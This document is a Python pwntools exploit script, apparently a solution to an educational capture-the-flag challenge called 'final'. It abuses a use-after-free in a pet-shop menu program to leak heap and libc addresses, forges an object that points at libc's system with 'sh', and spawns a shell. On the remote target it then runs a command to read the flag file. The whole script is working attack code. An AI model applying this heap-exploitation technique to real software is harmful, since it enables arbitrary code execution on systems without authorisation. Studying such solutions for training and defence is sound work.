from pwn import *
import re
split = lambda v,sz: [v[i:i+sz] for i in range(0,len(v),sz)]

HOST, PORT = 'edu-ctf.zoolab.org', 30210
if args.HOST: HOST = args.HOST
if args.PORT: PORT = args.PORT

exe = context.binary = ELF('./final/share/final')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

if args.REMOTE:
    io = remote(HOST,PORT)
else:
    io = process(exe.path)
    pause()

def restore(leak):
    # check leak success (?
    assert len(leak) == 6
    addr = u64(leak.ljust(8, b'\0'))
    return addr
def wrap(m,e=0):
    if type(m) == int:
        m = str(m)
        e = 1
    if type(m) == str:
        m = m.encode()
    if e or len(m) == 0:
        m += b'\n'
    return m
def send(m, e=0):
    io.sendafter(b'> ', wrap(m,e))
def read(m = '\n', d = 0):
    r = io.readuntil(wrap(m))
    if d: r = r.decode()
    return r

def buy(type, sz, name, idx):
    send(1)
    send(type)
    send(sz)
    send(name)
    send(idx)
def release(idx):
    send(2)
    send(idx)
def change(idx, name, new_len = None):
    send(3)
    send(idx)
    if new_len is None:
        send('n\n')
    else:
        send('y\n')
        send(new_len)
    send(name)
def play(idx):
    send(4)
    send(idx)

def recv():
    res = re.findall(b'I am a cute (.*), my name is (.*) !!', read())[0]
    return res

buy('cat', 0x20, 'owo', 0)
release(0)
play(0)
heap_base = restore(recv()[0]) - 0x2d0
info(f'heap base: {hex(heap_base)}')

buy('cat', 0x410, 'owo', 0)
buy('cat', 0x10, 'owo', 1)
release(0)
play(0)
libc.address = restore(recv()[1]) - 0x1ebbe0
info(f'libc base: {hex(libc.address)}')

fake_anmal = flat({
    0: b'sh\0',
    0x10: [0, 0, libc.sym.system]
})
change(1, fake_anmal, 0x28)

play(0)

if not args.REMOTE:
    io.interactive()
else:
    io.clean(1)
    io.sendline(b'cat /home/`whoami`/flag*')
    flag = io.readuntil(b'}').strip().decode()
    success(flag)
